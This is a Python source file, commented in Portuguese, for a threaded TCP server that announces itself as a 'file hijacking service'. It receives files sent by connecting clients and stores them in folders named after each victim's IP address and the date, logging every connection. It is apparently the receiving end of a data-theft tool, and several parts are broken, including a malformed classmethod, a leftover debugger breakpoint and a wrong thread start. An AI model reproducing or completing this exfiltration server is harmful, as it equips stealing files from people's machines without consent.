from os import mkdir
from random import randint
from threading import Thread
from datetime import datetime
from zlib import compress, decompress
from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR

class Servidor(Thread):
    def __init__(self, condicao=False, port=5000):
        Thread.__init__(self)
        self.condicao = condicao
        self.conexao = socket(AF_INET, SOCK_STREAM)
        self.conexao.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        self.conexao.bind(('', port))
        self.conexao.listen(10)
        self.ids = []
        print(f"INICIANDO SERVIÇO DE SEQUESTRO DE ARQUIVOS {port}! --- {datetime.now()}")

    def run(self):
        while self.condicao:
            con, cliente = self.conexao.accept()
            self.con = Thread(target=self.receberConexao, args=(con, cliente))
            self.con.start()

    @classmethod
    def ativarDesativarSrv(): self.condicao = not self.condicao
    
    def receberConexao(self, con, cliente):
        print(f"\nCONEXÕES ANTERIORES {self.ids}\n")
        print(f"[***] CLIENTE: ({cliente}) CONECTADO.... {datetime.now()} {con} [***]")
        con.sendall(f"VOCE E O CLIENTE {self.adicionar_ids(cliente)}\n".encode("utf8"))

        try:
            is_active = True
            while is_active:
                ddos = con.recv(1024)
                if(not ddos):  break
                else: self.receberArquivo(con, ddos)

            is_active = False
        except Exception as erro: print(f"FECHADO Á CONEXÃO {erro}")
        finally: con.close()

    def receberArquivo(self, con, ddos):
        pst = self.criarPastaReceber()
        self.ids[len(self.ids) - 1]['arquivo'] = ddos.decode().split(':')[2].split('\\')[-1][:-8]
        self.ids[len(self.ids) - 1]['tamanho'] = ddos.decode().split(':')[-1]
        
        try: self.log(f"ARQUIVO:{self.ids[len(self.ids) - 1]['arquivo']} TAMANHO:{float(self.ids[len(self.ids) - 1]['tamanho'])/1024}\n")
        except: return False
        con.sendall(b'ENVIE O ARQUIVO!')

        print('\n')
        with open(self.pst +'//'+ self.ids[len(self.ids) - 1]['arquivo'], "wb") as arquivo:
            total = self.ids[len(self.ids) - 1]['tamanho']
            buffer_arquivo = con.recv(1024)
            contador = 1024
            while buffer_arquivo:
                per = round((contador/float(total)) * 100, 2)
                arq = self.pst +'/'+ self.ids[len(self.ids) - 1]['arquivo']
                hos = self.ids[len(self.ids) - 1]['ip']
                print(f"RECEBENDO {arq} {hos} {per}%", end='\r')
                arquivo.write(buffer_arquivo)
                buffer_arquivo = con.recv(1024)
                contador += 1024
        print("TRANSFERENCIA DO {} EFETUADA COM SUCESSO!".format(arq))

    def adicionar_ids(self, cliente):
        cli = randint(1, 10000)
        self.ids.append({'data': datetime.now(), 'ip': cliente[0], 'id': cli})
        return cli

    def criarPastaReceber(self):
        dd = f'{datetime.now().day}-{datetime.now().month}-{datetime.now().year}_{datetime.now().hour}'
        self.pst = f"DDOS/{self.ids[len(self.ids) - 1]['ip']}_{dd}"
        for pst in ['DDOS', self.pst]:
            try: mkdir(pst)
            except: pass
        return self.pst
    
    def log(self, msg): 
        data = self.ids[len(self.ids) - 1]['data']
        ip = self.ids[len(self.ids) - 1]['ip']    
        ids = self.ids[len(self.ids) - 1]['id']
        try: 
                with open('DDOS/log.txt', 'a') as arq: arq.write(f"DATA:{data} IP{ip} ID:{ids}" + msg)
        except: pass

import pdb; pdb.set_trace()
srv = Servidor
vs = Thread(target=srv)
vs.start()
